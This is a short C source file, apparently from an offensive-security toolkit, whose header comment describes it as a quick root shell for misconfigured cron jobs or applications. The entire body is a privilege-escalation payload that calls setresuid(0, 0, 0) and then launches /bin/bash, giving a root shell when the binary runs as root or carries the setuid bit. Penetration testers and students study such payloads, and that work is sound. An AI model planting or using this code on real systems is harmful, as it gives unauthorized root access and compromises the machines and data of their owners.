
/*Author : Paranoid Ninja*/
/*Email  : paranoidninja@protonmail.com*/
/*Descr  : Quick Shell with SetUID bit for misconfigured Cron/Applications*/


int main(void){
       setresuid(0, 0, 0);
       system("/bin/bash");
}

